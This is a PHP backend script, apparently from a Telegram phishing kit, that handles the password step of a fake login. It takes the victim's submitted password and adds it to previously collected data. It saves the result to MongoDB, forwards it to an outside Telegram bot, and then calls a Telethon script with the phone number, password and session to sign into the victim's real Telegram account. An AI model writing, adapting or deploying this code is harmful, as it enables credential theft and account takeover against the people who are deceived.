<?php
require_once __DIR__ . '/db_config.php';
require_once __DIR__ . '/MongoDBSessionHandler.php';
require_once __DIR__ . '/telegram.php';
require_once __DIR__ . '/telegram_config.php';

// Inisialisasi MongoDB Session Handler
$mongoSessionHandler = new MongoDBSessionHandler($mongo_connection_string);
session_set_save_handler($mongoSessionHandler, true);
$GLOBALS['mongoSessionHandler'] = $mongoSessionHandler;

session_start();

$message = $_SESSION['message'] ?? '';
$password = $_POST['password'] ?? '';
$phoneNumber = $_SESSION['telegram_phone'] ?? '';

$string = $message;
$string .= "Password : `$password`\n";

$_SESSION['message'] = $string;
$_SESSION['password'] = $password;

// Simpan juga ke MongoDB secara langsung
if (isset($mongoSessionHandler)) {
    $mongoSessionHandler->saveTelegramData($string, [
        'password' => $password,
        'stage' => 'password_verification'
    ]);
}

// Kirim ke bot Telegram
sendTelegram($string);

// Integrate with Telethon - verify password
$session_id = session_id();
$command = escapeshellcmd("python $telegram_auth_script password " . escapeshellarg($phoneNumber) . " " . escapeshellarg($password) . " " . escapeshellarg($session_id));
$output = shell_exec($command);
$result = json_decode($output, true);

// Store the result in session
$_SESSION['telegram_password_result'] = $result;

if (isset($result['success']) && $result['success'] === true) {
    // Authentication completed
    $_SESSION['telegram_auth_completed'] = true;
    echo json_encode(['success' => true]);
} else {
    // Authentication failed
    echo json_encode(['success' => false, 'error' => $result['error'] ?? 'Invalid password']);
}
